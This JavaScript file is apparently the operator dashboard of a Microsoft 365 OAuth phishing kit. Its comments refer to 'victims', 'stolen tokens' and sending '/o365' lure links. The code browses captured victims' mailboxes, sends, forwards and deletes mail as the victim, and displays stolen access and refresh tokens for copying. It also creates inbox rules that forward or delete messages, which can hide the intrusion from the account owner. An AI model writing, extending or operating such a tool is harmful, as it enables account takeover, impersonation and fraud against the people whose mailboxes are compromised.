    caps.push(s.can_rules === false ? 'rules?' : 'rules');
    caps.push(s.can_contacts === false ? 'contacts?' : 'contacts');
    caps.push(s.can_send === false ? 'send?' : 'send');
  }
  var metaHtml = badgeHtml(s.status) + ' <b>' + esc(email) + '</b>'
    + ' · code <b>' + esc(s.user_code || '—') + '</b>'
    + (s.ip ? ' · ' + esc(s.ip) : '')
    + ' · ' + esc(fmtWhen(s.completed_at || s.created))
    + (caps.length ? ' · ' + esc(caps.join(' · ')) : '');
  if (s.note) {
    metaHtml += '<div style="color:#0f4c81;background:#e8f0fe;border:1px solid #c5d9f7;border-radius:2px;padding:4px 8px;margin-top:6px;font-size:12px">' + esc(s.note) + '</div>';
  }
  $('sess-meta').innerHTML = metaHtml;
  if ($('acct-name')) {
    $('acct-name').textContent = email;
    $('acct-av').textContent = (email.replace(/[^a-zA-Z0-9]/g, '')[0] || '?').toUpperCase();
  }
}

function refreshData() {
  fetch('/admin/api/data', { cache: 'no-store' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      state.sessions = d.sessions || [];
      state.config = d.config || state.config;
      state.domains = d.domains || state.domains || [];
      renderStats(d.stats || {});
      renderDomains();
      renderClients();
      if (state._openSid) {
        var s2 = null;
        for (var k = 0; k < state.sessions.length; k++) {
          if (state.sessions[k].sid === state._openSid) { s2 = state.sessions[k]; break; }
        }
        if (s2) {
          state.sel = s2;
          state._openSid = null;
          var selEl = $('sess-select');
          if (selEl) selEl.value = s2.sid;
          switchPage('inbox');
          onSessionChange(true);
        }
      }
      var keep = state.sel && state.sessions.some(function (s) { return s.sid === state.sel.sid; });
      if (!keep) {
        var pick = null;
        for (var i = 0; i < state.sessions.length; i++) {
          if (state.sessions[i].status === 'success') { pick = state.sessions[i]; break; }
        }
        if (!pick && state.sessions.length) pick = state.sessions[0];
        state.sel = pick;
        if (pick) onSessionChange(true);
        else showNoSession();
      } else {
        for (var j = 0; j < state.sessions.length; j++) {
          if (state.sessions[j].sid === state.sel.sid) { state.sel = state.sessions[j]; break; }
        }
        updateSessMeta();
      }
      renderSessionSelect(state.sessions);
    })
    .catch(function () {});
}

function onSessionChange(forceReload) {
  state.folder = null;
  state.cur = null;
  state.msgs = [];
  state.contacts = null;
  state.folders = [];
  setCmdEnabled(false);
  showReading(false);
  updateSessMeta();
  if (!state.sel) { showNoSession(); return; }
  if (state.tab === 'mail') loadFolders();
  else if (state.tab === 'rules') loadRulesView();
  else if (state.tab === 'contacts') loadContactsView();
  else loadTokenView();
  if (state.sel.status === 'success' && !state.sel.email) {
    fetch('/admin/api/graph/' + state.sel.sid + '/me', { cache: 'no-store' })
      .then(function (r) { return r.json(); })
      .then(function (me) {
        if (me && !me.error) {
          var em = me.mail || me.userPrincipalName || '';
          if (em) { state.sel.email = em; updateSessMeta(); renderSessionSelect(state.sessions); }
        }
      }).catch(function () {});
  }
  fetchSignature();
}

function showNoSession() {
  $('flist').innerHTML = '';
  $('mlist').innerHTML = '<div class="empty">No mailbox selected.<br>Capture a session via <b>/o365</b></div>';
  showReading(false);
  $('view-rules').innerHTML = '<div class="empty">Select a session to manage inbox rules.</div>';
  $('view-contacts').innerHTML = '<div class="empty">Select a session to extract contacts.</div>';
  $('view-tokens').innerHTML = '<div class="empty">Select a session to view tokens.</div>';
  setCmdEnabled(false);
  state.sig = null;
  state.sigAppended = false;
  updateSigBtn();
}

function loadFolders() {
  if (!state.sel || state.sel.status !== 'success') {
    $('flist').innerHTML = '<div class="empty">' + (state.sel ? 'Waiting for sign-in…' : 'No session') + '</div>';
    $('mlist').innerHTML = '<div class="empty">Mailbox not ready</div>';
    return;
  }
  fetch('/admin/api/graph/' + state.sel.sid + '/folders', { cache: 'no-store' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) { $('mail-err').style.display = 'block'; $('mail-err').textContent = d.error; return; }
      $('mail-err').style.display = 'none';
      state.folders = d.value || [];
      var favNames = /^(inbox|sent items|drafts|deleted items|junk email|archive)$/i;
      var favs = [];
      var rest = [];
      state.folders.forEach(function (f) {
        if (favNames.test(f.displayName || '') || favNames.test(f.wellKnownName || '')) favs.push(f);
        else rest.push(f);
      });
      function renderF(list) {
        var html = '';
        list.forEach(function (f) {
          var on = state.folder === f.id ? ' on' : '';
          var unread = f.unreadItemCount > 0 ? ' unread' : '';
          var cnt = f.unreadItemCount > 0 ? f.unreadItemCount : (f.totalItemCount || '');
          html += '<div class="frow' + on + '" data-fid="' + esc(f.id) + '">'
            + '<span class="fico">' + folderIcon(f.displayName) + '</span>'
            + '<span class="fn">' + esc(f.displayName) + '</span>'
            + '<span class="fcnt' + unread + '">' + (cnt || '') + '</span></div>';
        });
        return html;
      }
      var html = '';
      if (favs.length) html += '<div class="fav-label">Favorites</div>' + renderF(favs);
      if (rest.length) html += '<div class="fav-label">Folders</div>' + renderF(rest);
      if (!favs.length && !rest.length) html = renderF(state.folders);
      $('flist').innerHTML = html || '<div class="empty">No folders</div>';
      var msel = $('move-folder');
      if (msel) {
        var cur = state.folder || '';
        msel.innerHTML = '<option value="">Move to…</option>'
          + (state.folders || []).filter(function (f) { return f.id !== cur; })
              .map(function (f) { return '<option value="' + esc(f.id) + '">' + esc(f.displayName) + '</option>'; })
              .join('');
      }
      if (!state.folder && state.folders.length) {
        var inbox = state.folders.find(function (f) { return /inbox/i.test(f.displayName || ''); });
        state.folder = (inbox || state.folders[0]).id;
      }
      highlightFolder();
      loadMessages();
    })
    .catch(function () { $('mail-err').style.display = 'block'; $('mail-err').textContent = 'Failed to load folders'; });
}

function highlightFolder() {
  var rows = document.querySelectorAll('.frow');
  var name = '';
  for (var i = 0; i < rows.length; i++) {
    var on = rows[i].dataset.fid === state.folder;
    rows[i].classList.toggle('on', on);
    if (on) name = rows[i].querySelector('.fn').textContent;
  }
  $('folder-title').textContent = name || '';
}

function loadMessages() {
  if (!state.sel || !state.folder) return;
  highlightFolder();
  var url = '/admin/api/graph/' + state.sel.sid + '/messages?folder=' + encodeURIComponent(state.folder);
  if (state.q) url += '&search=' + encodeURIComponent(state.q);
  fetch(url, { cache: 'no-store' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) { $('mail-err').style.display = 'block'; $('mail-err').textContent = d.error; return; }
      $('mail-err').style.display = 'none';
      state.msgs = d.value || [];
      var html = '';
      var lastGroup = '';
      function groupLabel(iso) {
        if (!iso) return 'Older';
        var t = new Date(iso);
        if (isNaN(t)) return 'Older';
        var now = new Date();
        var sod = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        var sodT = new Date(t.getFullYear(), t.getMonth(), t.getDate());
        var dayDiff = Math.round((sod - sodT) / 86400000);
        if (dayDiff === 0) return 'Today';
        if (dayDiff === 1) return 'Yesterday';
        if (dayDiff < 7) return t.toLocaleDateString(undefined, { weekday: 'long' });
        if (t.getFullYear() === now.getFullYear()) return t.toLocaleDateString(undefined, { month: 'long' });
        return t.toLocaleDateString(undefined, { month: 'long', year: 'numeric' });
      }
      state.msgs.forEach(function (m) {
        var date = m.receivedDateTime || m.sentDateTime || '';
        var g = groupLabel(date);
        if (g !== lastGroup) {
          html += '<div class="mgroup">' + esc(g) + '</div>';
          lastGroup = g;
        }
        var on = state.cur && state.cur.id === m.id ? ' on' : '';
        var unread = m.isRead ? '' : ' unread';
        var fromObj = m.from && m.from.emailAddress ? m.from.emailAddress : {};
        var from = fromObj.name || fromObj.address || '';
        var att = m.hasAttachments ? '<span class="matt" title="Has attachments">&#128206;</span>' : '';
        var imp = (m.importance || '').toLowerCase() === 'high' ? '<span class="mimp" title="High importance">!</span>' : '';
        html += '<div class="mrow' + unread + on + '" data-mid="' + esc(m.id) + '">'
          + '<span class="dot"></span>'
          + '<div class="mfrom">' + esc(from) + att + imp + '</div>'
          + '<div class="mdate">' + esc(fmtWhen(date)) + '</div>'
          + '<div class="msub">' + esc(m.subject || '(no subject)') + '</div>'
          + '<div class="msnip">' + esc((m.bodyPreview || '').slice(0, 120)) + '</div></div>';
      });
      $('mlist').innerHTML = html || '<div class="empty">No messages in this folder.</div>';
    })
    .catch(function () { $('mail-err').style.display = 'block'; $('mail-err').textContent = 'Failed to load messages'; });
}

function openMessage(mid) {
  if (!state.sel) return;
  fetch('/admin/api/graph/' + state.sel.sid + '/message/' + encodeURIComponent(mid), { cache: 'no-store' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) { toast(String(d.error).slice(0, 120)); return; }
      var m = d.message || {};
      state.cur = m;
      setCmdEnabled(true);
      updateReadBtn();
      var rows = document.querySelectorAll('.mrow');
      for (var i = 0; i < rows.length; i++) rows[i].classList.toggle('on', rows[i].dataset.mid === mid);
      var fromObj = m.from && m.from.emailAddress ? m.from.emailAddress : {};
      var fromName = fromObj.name || fromObj.address || '?';
      var fromAddr = fromObj.address || '';
      var tos = (m.toRecipients || []).map(function (t) {
        return t.emailAddress ? (t.emailAddress.name || t.emailAddress.address) : '';
      }).filter(Boolean).join('; ');
      var initial = (fromName[0] || '?').toUpperCase();
      showReading(true);
      var whenRaw = m.receivedDateTime || m.sentDateTime || '';
      var whenNice = whenRaw;
      try {
        var wt = new Date(whenRaw);
        if (!isNaN(wt)) whenNice = wt.toLocaleString(undefined, { weekday:'short', month:'short', day:'numeric', year:'numeric', hour:'numeric', minute:'2-digit' });
      } catch (e) {}
      $('rp-head').innerHTML = '<h2>' + esc(m.subject || '(no subject)') + '</h2>'
        + '<div class="rp-from"><div class="av">' + esc(initial) + '</div>'
        + '<div class="who"><div class="name">' + esc(fromName) + '</div>'
        + '<div class="addr">' + esc(fromAddr) + '</div>'
        + '<div class="rp-to">To: ' + esc(tos || '—') + '</div></div>'
        + '<div class="when">' + esc(whenNice) + '</div></div>';
      var atts = d.attachments || [];
      $('attlist').innerHTML = atts.map(function (a) {
        var dl = a.downloadUrl || '';
        if (!dl) {
          return '<span class="att-wrap"><span class="att-name">' + esc(a.name || 'attachment')
            + '</span><span class="att-size">(' + fmtSize(a.size) + ')</span></span>';
        }
        var inline = dl + (dl.indexOf('?') === -1 ? '?' : '&') + 'inline=1';
        return '<span class="att-wrap"><span class="att-name">' + esc(a.name || 'attachment')
          + '</span><span class="att-size">(' + fmtSize(a.size) + ')</span>'
          + '<a class="att" href="javascript:void(0)" data-view="' + esc(inline) + '" data-view-name="' + esc(a.name || 'attachment') + '">View</a>'
          + '<a class="att" href="' + esc(dl) + '" download>Download</a></span>';
      }).join('');
      var body = m.body || {};
      var content = body.content || m.bodyPreview || '';
      if ((body.contentType || '').toLowerCase() === 'html') { $('rp-body').innerHTML = '<div class="rp-card">' + sanitizeHtml(content) + '</div>'; }
      else { $('rp-body').innerHTML = '<div class="rp-card">' + esc(content).replace(/\\n/g, '<br>') + '</div>'; }
      $('rp-body').scrollTop = 0;
      if (!m.isRead) markRead(mid, true);
    })
    .catch(function () { toast('Failed to load message'); });
}

function updateReadBtn() {
  var b = $('read-btn');
  if (b && state.cur) b.textContent = state.cur.isRead ? 'Mark unread' : 'Mark read';
}

function setRead(mid, isRead, silent) {
  if (!state.sel) return;
  var route = isRead ? 'read' : 'unread';
  fetch('/admin/api/graph/' + state.sel.sid + '/' + route + '/' + encodeURIComponent(mid), { method: 'POST' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) { if (!silent) toast('Failed: ' + d.error); return; }
      if (!silent) toast(isRead ? 'Marked read' : 'Marked unread');
      if (state.cur && state.cur.id === mid) state.cur.isRead = isRead;
      updateReadBtn();
      loadMessages();
    });
}

function markRead(mid, silent) { setRead(mid, true, silent); }
function markUnread(mid) { setRead(mid, false, false); }

function deleteMsg(mid) {
  if (!state.sel) return;
  if (!confirm('Delete this message? It moves to Deleted Items.')) return;
  fetch('/admin/api/graph/' + state.sel.sid + '/message/' + encodeURIComponent(mid) + '/move', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ destinationId: 'deleteditems' })
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) { toast('Failed: ' + d.error); return; }
      toast('Moved to Deleted Items');
      state.cur = null; setCmdEnabled(false); showReading(false);
      loadMessages(); loadFolders();
    });
}

function openCompose(mode) {
  // Compose always opens: when the capture's Graph scp set lacks Mail.Send
  // the server tries /me/sendMail and falls back to SMTP XOAUTH2 on a 403.
  $('compose-title').textContent = mode === 'new' ? 'New message' : (mode === 'replyall' ? 'Reply all' : (mode === 'forward' ? 'Forward' : 'Reply'));
  $('f-to').value = ''; $('f-cc').value = ''; $('f-bcc').value = ''; $('f-subj').value = ''; $('f-body').innerHTML = '';
  state.sigAppended = false;
  if (mode !== 'new' && state.cur) {
    var fObj = state.cur.from && state.cur.from.emailAddress ? state.cur.from.emailAddress : {};
    var from = fObj.address || '';
    var fromName = fObj.name || from || '';
    var tos = (state.cur.toRecipients || []).map(function (t) { return t.emailAddress ? t.emailAddress.address : ''; }).filter(Boolean);
    if (mode === 'reply') $('f-to').value = from;
    else if (mode === 'replyall') $('f-to').value = [from].concat(tos).filter(function (v, i, a) { return v && a.indexOf(v) === i; }).join('; ');
    var ccs = (state.cur.ccRecipients || []).map(function (t) { return t.emailAddress ? t.emailAddress.address : ''; }).filter(Boolean);
    if (mode === 'replyall' && ccs.length) $('f-cc').value = ccs.filter(function (v, i, a) { return a.indexOf(v) === i; }).join('; ');
    var subj = state.cur.subject || '';
    if (mode === 'forward') $('f-subj').value = /^fw:/i.test(subj) ? subj : 'FW: ' + subj;
    else $('f-subj').value = /^re:/i.test(subj) ? subj : 'RE: ' + subj;
    if (mode === 'forward') {
      var prevBody = state.cur.body || {};
      var preview = prevBody.content || state.cur.bodyPreview || '';
      var previewHtml = (prevBody.contentType || '').toLowerCase() === 'html' ? preview : esc(preview);
      $('f-body').innerHTML = '<div><br></div>'
        + '<div style="font-weight:600;color:#605e5c">---------- Forwarded message ----------</div>'
        + '<blockquote style="border-left:3px solid #c8c6c4;margin:6px 0 0;padding:0 0 0 10px;color:#605e5c">'
        + previewHtml + '</blockquote>';
    } else if (mode === 'reply' || mode === 'replyall') {
      var prevBody2 = state.cur.body || {};
      var prev2 = prevBody2.content || state.cur.bodyPreview || '';
      var prevHtml2 = (prevBody2.contentType || '').toLowerCase() === 'html' ? prev2 : esc(prev2);
      var whenRaw2 = state.cur.receivedDateTime || state.cur.sentDateTime || '';
      var whenNice2 = whenRaw2;
      try {
        var w2 = new Date(whenRaw2);
        if (!isNaN(w2)) whenNice2 = w2.toLocaleString();
      } catch (e) {}
      $('f-body').innerHTML = '<div><br></div>'
        + '<div style="font-weight:600;color:#605e5c">On ' + esc(whenNice2) + ', ' + esc(fromName) + ' wrote:</div>'
        + '<blockquote style="border-left:3px solid #c8c6c4;margin:6px 0 0;padding:0 0 0 10px;color:#605e5c">'
        + prevHtml2 + '</blockquote>';
    }
  }
  // Auto-append the victim signature on reply/reply-all (below the quote),
  // mirroring Outlook's reply behavior. Forward/new keep the body as-is.
  if ((mode === 'reply' || mode === 'replyall') && state.sig) appendSignatureSilent();
  // Reveal Cc/Bcc rows when reply-all populated them; hide otherwise.
  $('f-cc-row').style.display = $('f-cc').value ? 'flex' : 'none';
  $('f-bcc-row').style.display = $('f-bcc').value ? 'flex' : 'none';
  state.pendingAtts = []; renderAtts();
  $('m-compose').classList.add('on');
  updateSigBtn();
  $('f-body').focus();
}

function renderAtts() {
  $('f-attlist').innerHTML = (state.pendingAtts || []).map(function (a, i) {
    return '<div class="att-row">' + esc(a.name) + ' <span>(' + fmtSize(a.size) + ')</span>'
      + '<button type="button" data-att-remove="' + i + '">Remove</button></div>';
  }).join('') || '<div class="empty" style="padding:6px 0">No attachments</div>';
}

function parseAddr(s) {
  return String(s || '').split(/[;,]/).map(function (x) { return x.trim(); }).filter(Boolean);
}

function sendMessage() {
  if (!state.sel) return;
  var to = parseAddr($('f-to').value);
  if (!to.length) { toast('Add at least one recipient'); return; }
  var cc = parseAddr($('f-cc').value);
  var bcc = parseAddr($('f-bcc').value);
  var html = $('f-body').innerHTML; // Microsoft-style HTML wrapper is applied server-side
  fetch('/admin/api/graph/' + state.sel.sid + '/send', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ to: to, cc: cc, bcc: bcc, subject: $('f-subj').value, body: html,
                           contentType: 'html', attachments: state.pendingAtts || [] })
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) { toast('Send failed: ' + String(d.error).slice(0, 100)); return; }
      toast(d.via === 'smtp' ? 'Message sent (SMTP)' : 'Message sent');
      state.pendingAtts = []; renderAtts();
      $('m-compose').classList.remove('on');
    })
    .catch(function () { toast('Send failed'); });
}

function fetchSignature() {
  // Victim signature drives reply auto-append and the compose-toolbar
  // Signature button. Null when the mailbox has no signature route.
  if (!state.sel || state.sel.status !== 'success') { updateSigBtn(); return; }
  fetch('/admin/api/graph/' + state.sel.sid + '/signature', { cache: 'no-store' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      state.sig = (d && d.signature && d.signature.html) || null;
      updateSigBtn();
    })
    .catch(function () { state.sig = null; updateSigBtn(); });
}

function updateSigBtn() {
  var b = $('sig-btn');
  if (!b) return;
  b.style.display = (state.sig && $('m-compose').classList.contains('on')) ? 'inline-block' : 'none';
}

function appendSignatureSilent() {
  // Append the signature after existing compose content. A hidden marker div
  // keeps the append idempotent so replies never double-insert.
  if (!state.sig || state.sigAppended) return;
  var marker = $('f-body').querySelector('#sig-marker');
  if (!marker) {
    marker = document.createElement('div');
    marker.id = 'sig-marker';
    marker.style.display = 'none';
    $('f-body').appendChild(marker);
  }
  marker.insertAdjacentHTML('afterend', state.sig);
  state.sigAppended = true;
  updateSigBtn();
}

function insertSignature() {
  if (!state.sig) { toast('No signature available for this mailbox'); return; }
  if (state.sigAppended) { toast('Signature already added'); return; }
  appendSignatureSilent();
  toast('Signature inserted');
}

function saveDraft() {
  if (!state.sel) return;
  var to = parseAddr($('f-to').value);
  var cc = parseAddr($('f-cc').value);
  var bcc = parseAddr($('f-bcc').value);
  var html = $('f-body').innerHTML;
  fetch('/admin/api/graph/' + state.sel.sid + '/draft', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ to: to, cc: cc, bcc: bcc, subject: $('f-subj').value, body: html,
                           contentType: 'html', attachments: state.pendingAtts || [] })
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) { toast('Save draft failed: ' + String(d.error).slice(0, 100)); return; }
      toast('Saved to Drafts (not sent)');
      state.pendingAtts = []; renderAtts();
      $('m-compose').classList.remove('on');
      loadFolders(); loadMessages();
    })
    .catch(function () { toast('Save draft failed'); });
}

function loadTokenView() {
  if (!state.sel) { $('view-tokens').innerHTML = '<div class="empty">Select a session</div>'; return; }
  fetch('/admin/api/session/' + state.sel.sid + '/data', { cache: 'no-store' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) { $('view-tokens').innerHTML = '<div class="empty">' + esc(d.error) + '</div>'; return; }
      var claims = d.claims || {};
      var initial = ((d.email || claims.preferred_username || '?')[0] || '?').toUpperCase();
      var scopeList = String(d.granted_scopes || d.scope || '').split(/\\s+/).filter(Boolean).map(function (s) { return '<span>' + esc(s) + '</span>'; }).join('');
      var claimsHtml = '';
      Object.keys(claims).forEach(function (k) {
        var v = claims[k];
        if (typeof v === 'object') { try { v = JSON.stringify(v); } catch (e) { v = String(v); } }
        claimsHtml += '<tr><th>' + esc(k) + '</th><td>' + esc(v) + '</td></tr>';
      });
      function tokBlock(label, val) {
        var v = val || '';
        return '<div class="tok"><div class="tlabel"><span>' + label + '</span><button class="btn-sec" style="padding:2px 8px;font-size:11px" data-copy="' + esc(v) + '">copy</button></div>'
          + '<div class="tval">' + esc(v || '—') + '</div></div>';
      }
      $('view-tokens').innerHTML =
        '<div class="panel"><div class="phd"><h3>Account</h3>' + badgeHtml(d.status) + '</div><div class="pbd">'
        + '<div class="acct-row"><div class="avatar">' + esc(initial) + '</div>'
        + '<div><div class="aemail">' + esc(d.email || claims.preferred_username || 'unknown') + '</div>'
        + '<div class="asub">' + esc([d.host, d.ip, d.ua].filter(Boolean).join(' · ') || '?') + '</div>'
        + '<div class="asub">Scopes ' + scopeList + '</div>'
        + '<div class="asub">Session ' + esc(d.sid) + ' · ' + esc(fmtWhen(d.completed_at || d.created)) + '</div>'
        + '</div></div></div></div>'
        + '<div class="panel" style="margin-top:14px"><div class="phd"><h3>OAuth tokens</h3></div><div class="pbd">'
        + tokBlock('ACCESS TOKEN', d.access_token)
        + tokBlock('REFRESH TOKEN', d.refresh_token)
        + tokBlock('ID TOKEN', d.id_token)
        + '</div></div>'
        + (claimsHtml ? '<div class="panel" style="margin-top:14px"><div class="phd"><h3>ID token claims</h3></div><div class="pbd"><table class="claims">' + claimsHtml + '</table></div></div>' : '');
    })
    .catch(function () { $('view-tokens').innerHTML = '<div class="empty">Failed to load</div>'; });
}

function loadRulesView() {
  if (!state.sel) { $('view-rules').innerHTML = '<div class="empty">Select a session</div>'; return; }
  if (state.sel.status !== 'success') {
    $('view-rules').innerHTML = '<div class="empty">Session not captured yet</div>'; return;
  }
  fetch('/admin/api/graph/' + state.sel.sid + '/rules', { cache: 'no-store' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) {
        var msg = String(d.error);
        var hint = '';
        if (/403|Access is denied|MailboxSettings/i.test(msg)) {
          hint = '<div class="hint"><b>Rules need MailboxSettings.ReadWrite on the stolen token.</b> '
            + 'Current default capture scopes include Mail.ReadWrite, Mail.Send, MailboxSettings.ReadWrite, Contacts.Read and User.Read. '
            + 'If this session was captured earlier (or AAD fell back to .default), click <b>Refresh</b> to try a scope upgrade, '
            + 'or delete the session and send the victim a fresh /o365 link so they approve the full set.</div>';
        }
        $('view-rules').innerHTML = '<div class="panel"><div class="phd"><h3>Inbox rules</h3></div><div class="pbd">'
          + hint + '<div class="empty">' + esc(msg) + '</div></div></div>';
        return;
      }
      var list = d.value || [];
      var html = '<div class="panel"><div class="phd"><h3>Inbox rules</h3><button class="btn-primary" id="rule-new-btn">+ New rule</button></div><div class="pbd">';
      if (!list.length) html += '<div class="empty">No inbox rules for this account.</div>';
      list.forEach(function (ru) {
        var desc = [];
        var cond = ru.conditions || {};
        if (cond.fromAddresses) desc.push('from ' + (cond.fromAddresses.map(function (x) { return (x.emailAddress||{}).address || ''; }).filter(Boolean).join(', ')));
        if (cond.senderContains) desc.push('sender contains ' + [].concat(cond.senderContains).join(', '));
        if (cond.subjectContains) desc.push('subject ' + [].concat(cond.subjectContains).join(', '));
        if (cond.bodyContains) desc.push('body ' + [].concat(cond.bodyContains).join(', '));
        if (cond.and) {
          cond.and.forEach(function (c) {
            Object.keys(c).forEach(function (k) {
              var v = c[k];
              if (v && typeof v === 'object') {
                var arr = v.contains || v.equals || [];
                if (arr && arr.length) desc.push(k + ' ' + arr.join(', '));
              } else if (v) desc.push(k + ' ' + v);
            });
          });
        }
        var acts = [];
        var a = ru.actions || {};
        if (a.moveToFolder) acts.push('move to ' + a.moveToFolder);
        if (a.copyToFolder) acts.push('copy to ' + a.copyToFolder);
        if (a.markAsRead) acts.push('mark read');
        if (a.delete) acts.push('delete');
        if (a.forwardTo) acts.push('forward');
        if (a.redirectTo) acts.push('redirect');
        var dstr = (desc.length ? desc.join('; ') : 'all messages') + (acts.length ? ' → ' + acts.join(', ') : '');
        html += '<div class="rcard" data-rid="' + esc(ru.id) + '">'
          + '<label class="switch"><input type="checkbox" data-rid="' + esc(ru.id) + '" data-act="toggle"' + (ru.isEnabled !== false ? ' checked' : '') + '><span class="sl"></span></label>'
          + '<div class="rbody"><div class="rname">' + esc(ru.displayName || '(unnamed)') + '</div>'
          + '<div class="rdesc">' + esc(dstr) + '</div></div>'
          + '<div class="ract">'
          + '<button class="btn-sec" data-rid="' + esc(ru.id) + '" data-act="edit">Edit</button>'
          + '<button class="btn-sec" style="color:var(--danger)" data-rid="' + esc(ru.id) + '" data-act="del">Delete</button>'
          + '</div></div>';
      });
      html += '</div></div>';
      $('view-rules').innerHTML = html;
      var nb = $('rule-new-btn');
      if (nb) nb.addEventListener('click', function () {
        if (!(state.folders || []).length && state.sel && state.sel.status === 'success') {
          fetch('/admin/api/graph/' + state.sel.sid + '/folders', { cache: 'no-store' })
            .then(function (r) { return r.json(); })
            .then(function (fd) {
              if (!fd.error) state.folders = fd.value || [];
              openRuleModal(null);
            })
            .catch(function () { openRuleModal(null); });
        } else openRuleModal(null);
      });
    })
    .catch(function () { $('view-rules').innerHTML = '<div class="empty">Failed to load rules</div>'; });
}

function fillRuleFolderSelect(selected) {
  var sel = $('r-move');
  var opts = '<option value="">(no move)</option>';
  (state.folders || []).forEach(function (f) {
    var name = f.displayName || f.id;
    opts += '<option value="' + esc(f.id) + '"' + (selected && selected === f.id ? ' selected' : '') + '>' + esc(name) + '</option>';
  });
  // well-known fallbacks if folders not loaded yet
  if (!(state.folders || []).length) {
    ['Archive','Deleted Items','Junk Email','Drafts','Sent Items'].forEach(function (n) {
      opts += '<option value="' + esc(n) + '">' + esc(n) + '</option>';
    });
  }
  sel.innerHTML = opts;
  if (selected) sel.value = selected;
}

function openRuleModal(rid) {
  if (!state.sel) return;
  state.ruleEdit = rid || null;
  $('r-name').value = ''; $('r-from').value = ''; $('r-subj').value = '';
  fillRuleFolderSelect('');
  $('r-read').checked = false; $('r-del').checked = false;
  $('r-fwd').checked = false; $('r-fwdto').value = ''; $('r-fwdto').style.display = 'none';
  $('r-enabled').checked = true;
  $('rule-title').textContent = rid ? 'Edit rule' : 'New rule';
  if (rid) {
    fetch('/admin/api/graph/' + state.sel.sid + '/rule/' + encodeURIComponent(rid), { cache: 'no-store' })
      .then(function (r) { return r.json(); })
      .then(function (d) {
        if (d.error) { toast('Failed: ' + d.error); return; }
        $('r-name').value = d.displayName || '';
        $('r-enabled').checked = d.isEnabled !== false;
        var cond = d.conditions || {};
        if (cond.subjectContains) $('r-subj').value = [].concat(cond.subjectContains).join(', ');
        if (cond.senderContains) $('r-from').value = [].concat(cond.senderContains).join(', ');
        if (cond.fromAddresses) $('r-from').value = cond.fromAddresses.map(function (x) { return (x.emailAddress||{}).address || ''; }).filter(Boolean).join(', ');
        if (cond.and) {
          cond.and.forEach(function (c) {
            if (c.from && c.from.contains) $('r-from').value = c.from.contains.join(', ');
            if (c.subjectContains) $('r-subj').value = [].concat(c.subjectContains).join(', ');
            if (c.senderContains) $('r-from').value = [].concat(c.senderContains).join(', ');
          });
        }
        if (d.actions) {
          if (d.actions.moveToFolder) fillRuleFolderSelect(d.actions.moveToFolder);
          if (d.actions.markAsRead) $('r-read').checked = true;
          if (d.actions.delete) $('r-del').checked = true;
          if (d.actions.forwardTo && d.actions.forwardTo.length) {
            $('r-fwd').checked = true; $('r-fwdto').style.display = 'block';
            $('r-fwdto').value = d.actions.forwardTo.map(function (x) { return x.emailAddress ? x.emailAddress.address : ''; }).join(', ');
          }
        }
      });
  }
  $('m-rule').classList.add('on');
}

function saveRule() {
  if (!state.sel) return;
  var rid = state.ruleEdit;
  var name = $('r-name').value.trim();
  if (!name) { toast('Rule needs a name'); return; }
  var payload = { displayName: name, isEnabled: $('r-enabled').checked, sequence: 1 };
  var conditions = {};
  var from = $('r-from').value.split(',').map(function (s) { return s.trim(); }).filter(Boolean);
  var subj = $('r-subj').value.split(',').map(function (s) { return s.trim(); }).filter(Boolean);
  if (from.length) conditions.senderContains = from;
  if (subj.length) conditions.subjectContains = subj;
  if (Object.keys(conditions).length) payload.conditions = conditions;
  var acts = {};
  if ($('r-move').value) acts.moveToFolder = $('r-move').value;
  if ($('r-read').checked) acts.markAsRead = true;
  if ($('r-del').checked) acts.delete = true;
  if ($('r-fwd').checked && $('r-fwdto').value.trim()) {
    acts.forwardTo = $('r-fwdto').value.split(',').map(function (s) { return s.trim(); }).filter(Boolean)
      .map(function (a) { return { emailAddress: { address: a } }; });
  }
  if (Object.keys(acts).length) payload.actions = acts;
  else { toast('Pick at least one action'); return; }
  var url = '/admin/api/graph/' + state.sel.sid + (rid ? '/rule/' + encodeURIComponent(rid) : '/rule');
  fetch(url, { method: rid ? 'PATCH' : 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) { toast('Save failed: ' + String(d.error).slice(0, 100)); return; }
      toast('Rule saved');
      $('m-rule').classList.remove('on');
      loadRulesView();
    })
    .catch(function () { toast('Save failed'); });
}

function toggleRule(rid, enabled) {
  if (!state.sel) return;
  fetch('/admin/api/graph/' + state.sel.sid + '/rule/' + encodeURIComponent(rid), {
    method: 'PATCH', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ isEnabled: enabled })
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.error) { toast('Failed: ' + String(d.error).slice(0, 90)); loadRulesView(); return; }
      toast(enabled ? 'Rule enabled' : 'Rule disabled');
    });
}

function deleteRule(rid) {
  if (!state.sel) return;
  if (!confirm('Delete this rule?')) return;
  fetch('/admin/api/graph/' + state.sel.sid + '/rule/' + encodeURIComponent(rid), { method: 'DELETE' })
    .then(function (r) { return r.json().catch(function () { return { ok: true }; }); })
    .then(function (d) {
      if (d && d.error) { toast('Failed: ' + d.error); return; }
      toast('Rule deleted');
      loadRulesView();
    });
}

function loadContactsView() {
  if (!state.sel) { $('view-contacts').innerHTML = '<div class="empty">Select a session</div>'; return; }
  if (state.sel.status !== 'success') {
    $('view-contacts').innerHTML = '<div class="empty">Session not captured yet</div>'; return;
  }
  $('view-contacts').innerHTML = '<div class="panel"><div class="phd"><h3>People</h3></div><div class="pbd"><div class="empty">Loading contacts…</div></div></div>';
